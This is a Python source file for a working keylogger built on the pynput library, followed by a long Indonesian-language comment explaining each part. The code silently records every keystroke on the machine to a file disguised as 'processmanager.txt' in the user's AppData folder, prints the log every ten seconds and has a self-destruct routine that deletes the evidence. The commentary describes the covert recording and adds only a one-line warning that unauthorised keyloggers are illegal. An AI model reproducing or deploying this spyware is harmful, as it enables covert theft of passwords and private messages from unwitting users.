import os
from pynput.keyboard import Listener
import time
import threading


class Keylogger():
    keys = []
    count = 0
    flag = 0
    path = os.environ['appdata'] +'\\processmanager.txt'
    #path = 'processmanager.txt'

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()

    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)

    def self_destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == '__main__':
    keylog = Keylogger()
    t = threading.Thread(target=keylog.start)
    t.start()
    while keylog.flag != 1:
        time.sleep(10)
        logs = keylog.read_logs()
        print(logs)
        #keylog.self_destruct()
    t.join()

# ================================================================
# Program ini adalah sebuah keylogger yang menggunakan pustaka pynput untuk memantau dan mencatat setiap keystroke yang dimasukkan oleh pengguna. Berikut adalah penjelasan alur kerjanya:

# 1. **Inisialisasi Kelas Keylogger**: Kelas `Keylogger` memiliki beberapa atribut dan metode:
#    - `keys`: List untuk menyimpan keystroke yang telah dimasukkan.
#    - `count`: Variabel untuk menghitung jumlah keystroke sebelum mencatatnya ke file.
#    - `flag`: Variabel penanda untuk menghentikan keylogger.
#    - `path`: Lokasi file log keylogger yang akan dibuat.
#    - Metode `on_press()`: Dipanggil setiap kali sebuah keystroke ditekan. Keystroke yang dimasukkan akan ditambahkan ke dalam list `keys`. Jika jumlah keystroke mencapai batas tertentu (dalam hal ini 1), keystroke tersebut akan dicatat ke dalam file menggunakan metode `write_file()` dan list `keys` akan direset.
#    - Metode `read_logs()`: Membaca isi dari file log keylogger.
#    - Metode `write_file()`: Menulis keystroke yang telah diubah ke dalam file log.
#    - Metode `self_destruct()`: Menghentikan keylogger dan menghapus file log.
#    - Metode `start()`: Memulai keylogger dengan mendengarkan setiap keystroke yang dimasukkan oleh pengguna menggunakan pynput.

# 2. **Inisialisasi Keylogger dan Thread**: Pada bagian `if __name__ == '__main__':`, objek `keylog` dari kelas `Keylogger` dibuat dan dimulai dalam sebuah thread. Program juga memulai loop yang berjalan selama `flag` keylogger tidak diatur ke 1 (menandakan keylogger belum berhenti). Setiap 10 detik, isi dari file log dibaca dan dicetak ke layar.

# 3. **Perekaman Keystroke**: Saat keylogger berjalan, setiap keystroke yang dimasukkan oleh pengguna akan direkam dan dicatat ke dalam file log.

# 4. **Penghentian Keylogger**: Keylogger dapat dihentikan dengan memanggil metode `self_destruct()`. Saat keylogger dihentikan, thread juga dihentikan dan file log akan dihapus.

# Dengan cara ini, program dapat merekam dan mencatat keystroke yang dimasukkan oleh pengguna secara diam-diam. Namun, penting untuk diingat bahwa penggunaan keylogger tanpa izin adalah ilegal dalam banyak yurisdiksi dan dapat menimbulkan masalah hukum.
